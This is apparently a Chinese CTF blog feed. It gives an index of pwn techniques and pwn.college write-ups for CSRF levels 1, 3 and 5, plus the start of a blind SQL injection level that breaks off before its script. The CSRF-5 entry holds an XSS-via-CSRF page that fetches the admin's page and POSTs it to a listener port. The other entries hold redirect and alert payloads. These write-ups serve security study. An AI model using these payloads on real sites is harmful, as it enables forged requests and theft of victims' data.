href="https://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/NULL-Free-Shellcode/">pwn.college题解：NULL-Free-Shellcode</a></p><h3 id="绕过strlen长度限制——0x00字节填充"><a href="#绕过strlen长度限制——0x00字节填充" class="headerlink" title="绕过strlen长度限制——0x00字节填充"></a>绕过strlen长度限制——0x00字节填充</h3><p>具体的题目实例见<a href="https://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/String-Lengths-hard/">pwn.college题解：String-Lengths-hard</a></p><h3 id="ROP之栈跃迁-1"><a href="#ROP之栈跃迁-1" class="headerlink" title="ROP之栈跃迁"></a>ROP之栈跃迁</h3><p>具体的题目实例见<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-9/">pwn.college题解：ROP-level-9</a></p><h2 id="其他刷题记录"><a href="#其他刷题记录" class="headerlink" title="其他刷题记录"></a>其他刷题记录</h2><h3 id="ret2text技巧"><a href="#ret2text技巧" class="headerlink" title="ret2text技巧"></a>ret2text技巧</h3><ol><li>32位程序，本身存在system和&#x2F;bin&#x2F;sh，直接return；具体的题目实例见<a href="https://0x4a-210.github.io/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-jarvisoj-level2/">BUUCTF题解：jarvisoj_level2</a><br></li><li>32位程序，存在多阶段后门函数，但要打包负数；具体的题目实例见<a href="https://0x4a-210.github.io/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-picoctf-2018-rop-chain/">BUUCTF题解：picoctf_2018_rop_chain</a><br></li><li>64位程序调用execve，需要布置3个参数，gadget里没有控制rdx的碎片，利用__libc_csu_init函数里的指令；具体的题目实例见<a href="https://0x4a-210.github.io/2025/08/05/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2csu/ret2csu-for-BUUCTF-ciscn-2019-s-3/">BUUCTF题解：ciscn_2019_s_3</a></li></ol><h3 id="沙箱及其绕过"><a href="#沙箱及其绕过" class="headerlink" title="沙箱及其绕过"></a>沙箱及其绕过</h3><p>具体的题目实例见分类”pwn刷题记录&#x2F;其他技巧类”下的文章：<a href="https://0x4a-210.github.io/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E6%B2%99%E7%AE%B1%E9%97%AE%E9%A2%98/">沙箱问题</a></p><h3 id="ret2shellcode技巧"><a href="#ret2shellcode技巧" class="headerlink" title="ret2shellcode技巧"></a>ret2shellcode技巧</h3><p>上述pwn.college的ret2shellcode仅是作为基础，其服务器并没有开启ASLR，导致可以直接硬编码栈地址为返回地址，而真实的CTF题目不会这么顺利，所以用2道题记录一下真正ret2shellcode时该怎么做<br></p><ol><li>泄露栈地址：<a href="https://0x4a-210.github.io/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/pwnable01-start/">pwnable题解：01-start</a><br></li><li>无需（也无法）泄露栈地址，则控制rsp：<a href="https://0x4a-210.github.io/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/BUUCTF-ciscn-2019-s-9/">BUUCTF题解：ciscn_2019_s_9</a><br><br>有时，即使开启了NX保护，依然可以使用shellcode解题，具体的题目实例见<a href="https://0x4a-210.github.io/2025/08/08/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/mprotect%E6%8A%80%E5%B7%A7/">mprotect技巧</a></li></ol><h3 id="ret2libc相关"><a href="#ret2libc相关" class="headerlink" title="ret2libc相关"></a>ret2libc相关</h3><ol><li>printf泄露libc基址：具体的题目实例见<a href="https://0x4a-210.github.io/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/">BUUCTF题解：[HarekazeCTF2019]baby_rop2</a><br></li><li>write泄露libc基址：具体的题目实例见<a href="https://0x4a-210.github.io/2025/08/01/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-jarvisoj-level1/">BUUCTF题解：jarvisoj-level1</a><br><br>通过以上两道题，加上最常见的puts函数泄露，目前可以总结出三种泄露方法：即puts、printf和write<br></li><li>无脑ret2libc的方法：具体的题目实例见分类”pwn刷题记录&#x2F;其他技巧类”下的文章：<a href="https://0x4a-210.github.io/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E7%9A%84%E9%80%9A%E8%A7%A3%EF%BC%9Aret2libc/">部分题目的通解：ret2libc</a></li></ol><h3 id="非劫持类手法：覆盖关键变量绕过检查"><a href="#非劫持类手法：覆盖关键变量绕过检查" class="headerlink" title="非劫持类手法：覆盖关键变量绕过检查"></a>非劫持类手法：覆盖关键变量绕过检查</h3><p>在溢出中，并不一定是覆盖到返回地址从而劫持控制流，还可以通过覆盖上方变量来绕过校验<br><br>具体的题目实例见分类”pwn刷题记录&#x2F;其他技巧类”下的文章：<a href="https://0x4a-210.github.io/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025-07-26-shaktictf-Amogus/">2025年7月26日shaktictf比赛题解：Amogus</a></p><h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>整数溢出基础例题（由于pwn.college上暂时没找到整数溢出类题目，以一道BUUCTF的题目为例进行记录）：<a href="https://0x4a-210.github.io/2025/08/06/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/BUUCTF-bjdctf-2020-babystack2/">BUUCTF题解：bjdctf_2020_babystack2</a></p><h3 id="覆写GOT表技巧"><a href="#覆写GOT表技巧" class="headerlink" title="覆写GOT表技巧"></a>覆写GOT表技巧</h3><ol><li><a href="https://0x4a-210.github.io/2025/09/09/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-09-06-ImaginaryCTF-addition/">2025年9月6日ImaginaryCTF比赛题解：addtion</a></li><li><a href="https://0x4a-210.github.io/2025/10/01/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/">BUUCTF-easyheap</a></li></ol><h2 id="做题时踩过的一些坑"><a href="#做题时踩过的一些坑" class="headerlink" title="做题时踩过的一些坑"></a>做题时踩过的一些坑</h2><h3 id="堆栈平衡问题"><a href="#堆栈平衡问题" class="headerlink" title="堆栈平衡问题"></a>堆栈平衡问题</h3><p>堆栈平衡问题仅针对64位程序，要求栈16字节对齐（但是实际发现有的劫持到后门函数的题，还需要跳过后门函数开始处的操作rbp的若干条指令，以及需要在后门函数后正确返回）<br><br>16字节对齐是因为Ubuntu18以后引入了对XMM寄存器的操作，但后两者的原因目前还不是很清楚……<br><br>具体的例子见：<a href="https://0x4a-210.github.io/2025/07/19/Questions/%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E9%97%AE%E9%A2%98/">Pwn的坑：堆栈平衡问题</a></p><h3 id="特殊情况下IDA获取偏移导致出错"><a href="#特殊情况下IDA获取偏移导致出错" class="headerlink" title="特殊情况下IDA获取偏移导致出错"></a>特殊情况下IDA获取偏移导致出错</h3><p>具体的例子见：<a href="https://0x4a-210.github.io/2025/08/06/Questions/%E4%B8%8D%E8%83%BD%E5%8F%AA%E5%9C%A8IDA%E9%87%8C%E7%9C%8B%E5%81%8F%E7%A7%BB/">Pwn的坑：不能只在IDA里看偏移</a></p><h3 id="有时劫持到后门函数需要正常exit"><a href="#有时劫持到后门函数需要正常exit" class="headerlink" title="有时劫持到后门函数需要正常exit"></a>有时劫持到后门函数需要正常exit</h3><p>具体的例子见：<a href="https://0x4a-210.github.io/2025/08/07/Questions/%E6%AD%A3%E5%B8%B8exit%E9%97%AE%E9%A2%98/">Pwn的坑：正常exit问题</a></p>]]></content>
    
    
    <categories>
      
      <category>串联梳理</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSRF-5</title>
    <link href="/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-5/"/>
    <url>/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-5/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>这一关将不允许通过Javascript获取cookie，因为服务端对cookie设置了HTTPonly属性，该设置仅允许通过http请求传送cookie值，因此XSS将无法再获得admin的cookie<br><br>但是依然可以通过CSRF伪造admin用户的请求以泄露flag</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>依然是admin账户下面有flag，而ephemeral依然接收一个msg查询字符串，所以思路就是利用这个msg把admin导向首页，再把请求体发给我们的服务器</p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>如下index.html：<br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSRF Attack<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> targetURL = <span class="hljs-string">&#x27;http://challenge.localhost/ephemeral?msg=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-string">&#x27;&lt;script&gt;fetch(&quot;http://challenge.localhost/&quot;).then(response=&gt;response.text()).then(flag=&gt;fetch(&quot;http://localhost:12345&quot;,&#123;method:&quot;POST&quot;,body:flag&#125;))&lt;\/script&gt;&#x27;</span>);</span><br><span class="language-javascript">       <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = targetURL;</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>依次启动&#x2F;server、python http.server和victim<br>然后还需要我们再去12345监听admin发回来的响应体，那里面就有flag</p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSRF-3</title>
    <link href="/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-3/"/>
    <url>/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-3/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>需要通过CSRF引起XSS，并且提示我们注意javascript标签的闭合问题</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>查看victim源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    WebDriverWait(browser, <span class="hljs-number">1</span>).until(EC.alert_is_present())<br><span class="hljs-keyword">except</span> TimeoutException:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failure: JavaScript alert did not trigger...&quot;</span>)<br>    sys.exit(<span class="hljs-number">3</span>)<br><span class="hljs-keyword">else</span>:<br>    browser.switch_to.alert.accept()<br>    <span class="hljs-keyword">if</span> browser.current_url.replace(<span class="hljs-string">&quot;:80&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).startswith(challenge_url.replace(<span class="hljs-string">&quot;:80&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Alert triggered! Your reward:&quot;</span>)<br>        <span class="hljs-built_in">print</span>(flag)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;It looks like the alert did not come from &#123;challenge_url&#125;/ephemeral?&quot;</span>)<br></code></pre></td></tr></table></figure><p>发现输出falg的逻辑是访问server的ephemeral路由，并检测是否有alert出现<br><br>回到server端查看该路由，可以看到有一个msg的查询字符串（即GET传参），因此存在admin账户的请求伪造，并触发admin账户执行相应的js代码的漏洞</p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>根据上述分析，只要我们可以把victim重定向到challenge.localhost&#x2F;ephemeral并在该页面执行js代码即可<br><br>故可以写出如下的页面：index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSRF Attack<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://challenge.localhost/ephemeral?msg=&lt;s&quot;</span>+<span class="hljs-string">&quot;cript&gt;alert(&#x27;PWNED&#x27;)&lt;\/script&gt;&quot;</span></span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>通过依次启动server、启动自己的服务（1337端口）、启动victim即可获得flag：<br><img src="/../../../../../../../photos/pwn.college/intro/Web/CSRF-3.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSRF-1</title>
    <link href="/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-1/"/>
    <url>/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-1/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>XSS注入JavaScript以导致受害者发起HTTP请求。 但是如果没有XSS怎么办？ 答案是直接“注入”HTTP请求。<br></p><span id="more"></span><p>web设计的目的是使许多不同的网站相互连接。 网站可以嵌入来自其他网站的图像，链接到其他网站，甚至重定向到其他网站。 所有这些灵活性意味着一些严重的安全风险，而且几乎没有任何措施可以防止恶意网站直接导致受害者访问者发出潜在的敏感请求，例如（在我们的例子中）将 GET 请求发送给 <a href="http://challenge.localhost/publish">http://challenge.localhost/publish</a> ！<br></p><p>这种类型的跨站点请求伪造被称为跨站请求伪造（Cross Site Request Forgery，简称CSRF）。<br></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先分析源码，这题其实存在XSS漏洞，但是admin不会访问&#x2F;challenge.localhost，因此没办法通过把js代码写到首页去骗admin重定向到publish路由<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge_get</span>():<br>    page = <span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;\nWelcome to pwnpost, now XSS-free (for admin, at least)!&lt;hr&gt;\n&quot;</span><br>    username = flask.session.get(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">if</span> username == <span class="hljs-string">&quot;admin&quot;</span>:<br>        page += <span class="hljs-string">&quot;&quot;&quot;&lt;b&gt;To prevent XSS, the admin does not view messages!&lt;/b&gt;&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>可以看到存在if username&#x3D;&#x3D;’admin’的额外校验，根据提示应该用CSRF；<br><br>接下来看一下victim源码：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">challenge_url = <span class="hljs-string">&quot;http://challenge.localhost:80/&quot;</span><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>).read().strip()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Visiting <span class="hljs-subst">&#123;challenge_url&#125;</span>&quot;</span>)<br>browser.get(challenge_url)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Logging in as admin...&quot;</span>)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Visiting the attacker&#x27;s website (http://hacker.localhost:1337/)...&quot;</span>)<br>browser.get(<span class="hljs-string">&quot;http://hacker.localhost:1337/&quot;</span>)<br>time.sleep(<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p>分析一下，主要分两个部分，第一个是请求challenge.localhost，并且以admin登录，接下来注意到第二部分会访问本地的1337端口；<br><br>因此只要我们在1337开一个web服务，把admin重定向到&#x2F;publish路由就可以了；<br><br>因此存在CSRF漏洞，可以从我们的“钓鱼网站”伪造admin在请求<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>综上，利用思路就是在1337开一个服务，等victim访问我们，然后再以guest身份登录challenge.localhost即可看到flag<br>开启服务有很多方法，题目里就提供了两个，一个最基础的nc，前面几题都用过，不再记录<br><br>另一个是python的http.server模块，个人感觉python的比nc方便，只要写一个简单的index.html就行；<br><br>因此写出如下的index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSRF Attack<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://challenge.localhost/publish&quot;</span></span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>综上，完整流程是：<br><br>首先启动&#x2F;challenge&#x2F;server<br><br>之后cd到保存有index.html的目录中并运行以下命令：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server 1337<br></code></pre></td></tr></table></figure><p>之后再运行&#x2F;challenge&#x2F;victim，最后刷新浏览器就可以了，也是成功拿到了flag<br><br><img src="/../../../../../../../photos/pwn.college/intro/Web/CSRF-1/CSRF-1.png"></p><h2 id="一点基础知识补充"><a href="#一点基础知识补充" class="headerlink" title="一点基础知识补充"></a>一点基础知识补充</h2><p>回看这个Wp，感觉缺了些基础知识的讲解，简单讲一下index.html怎么写出来的<br><br>其实主要是html里的这一句</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://challenge.localhost/publish&quot;</span></span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如果是完全零基础，大概率会有疑问window.location.href是个什么东西（记得pwn.college的前面题目都没讲过这个东西），这里浅浅演示一下，深入的还得自己查，直接看下面这两张图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Web/CSRF-1/window-location-href1.png"><br>首先上面第一张图，看到我在浏览器的url里输入了这么个东西：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">javascript:alert(window.location.href)<br></code></pre></td></tr></table></figure><p>拆解一下，alert没什么好说的，alert的参数就是window这一大串，这个url意思就是执行冒号后面的javascript代码，当点击回车的时候，由于当前位于b站的首页，浏览器就会显示b站的域名,如下图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Web/CSRF-1/window-location-href2.png"><br>这样应该能感受到，window这一串其实可以理解为网页域名，这道题里我们通过对它赋值，起到了重定向的作用<br><br>至于javascript:是什么，其实就是一个伪协议头，可以把它理解为http:&#x2F;&#x2F;这样的东西，搜一下完整的URL组成可以知道这些都是协议头，简单记忆就是不带&#x2F;&#x2F;的就是伪协议，反之就是我们常见的协议头<br><br>伪协议还有很多，像mailto:，这个协议后面跟邮箱，浏览器就会唤起电脑里默认的邮件应用程序，还有tel:，跟个号码，打电话用的<br><br>上述基础知识只是一个简单的补充，以后碰到具体题目再做记录</p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQLi-5</title>
    <link href="/2025/07/17/pwn.college/Intro-to-Cybersecurity/Web/SQLi-5/"/>
    <url>/2025/07/17/pwn.college/Intro-to-Cybersecurity/Web/SQLi-5/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>这一题和一般的SQL注入都不同，服务端将不再回显任何SQL查询的结果，但幸好题目提示我们，即便不显示任何数据，我们也可以一个字符一个字符的恢复，这可以通过查询时页面不同的行为来判断，比如认证成功or认证失败</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>看完题面大概猜到是一个盲注，需要自己写脚本了，一个字符一个字符的爆破，然后看一下server端的源代码：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge_post</span>():<br>    username = flask.request.form.get(<span class="hljs-string">&quot;username&quot;</span>)<br>    password = flask.request.form.get(<span class="hljs-string">&quot;password&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Missing `username` form parameter&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> password:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Missing `password` form parameter&quot;</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># https://www.sqlite.org/lang_select.html</span><br>        query = <span class="hljs-string">f&quot;SELECT rowid, * FROM users WHERE username = &#x27;<span class="hljs-subst">&#123;username&#125;</span>&#x27; AND password = &#x27;<span class="hljs-subst">&#123; password &#125;</span>&#x27;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;DEBUG: <span class="hljs-subst">&#123;query=&#125;</span>&quot;</span>)<br>        user = db.execute(query).fetchone()<br>    <span class="hljs-keyword">except</span> sqlite3.Error <span class="hljs-keyword">as</span> e:<br>        flask.abort(<span class="hljs-number">500</span>, <span class="hljs-string">f&quot;Query: <span class="hljs-subst">&#123;query&#125;</span>\nError: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user:<br>        flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Invalid username or password&quot;</span>)<br><br>    flask.session[<span class="hljs-string">&quot;user&quot;</span>] = username<br>    <span class="hljs-keyword">return</span> flask.redirect(flask.request.path)<br></code></pre></td></tr></table></figure><p>这里可以发现查询语句是直接拼接生成，因此存在SQL注入风险，同时根据查询执行结果的不同，返回状态码403或者重定向，因此这是一个布尔盲注类型</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>首先确定闭合类型，根据上述源码，可以看到username和password都是字符型，单引号闭合<br><br>由于不需要联合查询，因此这一题里面可以不用判断字段数量<br><br>（其实也很好判断，看源码，rowid加上*，表里面有两列，一共就是3列，如果要联合查询的话就应该是如union select 1,2,3；确保列数一致即可）<br><br>(备注：如果没有源码该怎么判断，此时需要用到二分法试探，以后碰到具体题目再做记录……)</p><p>根据上述分析，可以开始写盲注脚本，主要思路就是首先根据flag的长度（因为每题flag都是一样的长度，很容易确定）作为外层循环，内层循环逐个试探可打印字符；<br><br>判断是否和flag对上的标准就是看返回状态码是否&#x3D;302（即重定向），脚本如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 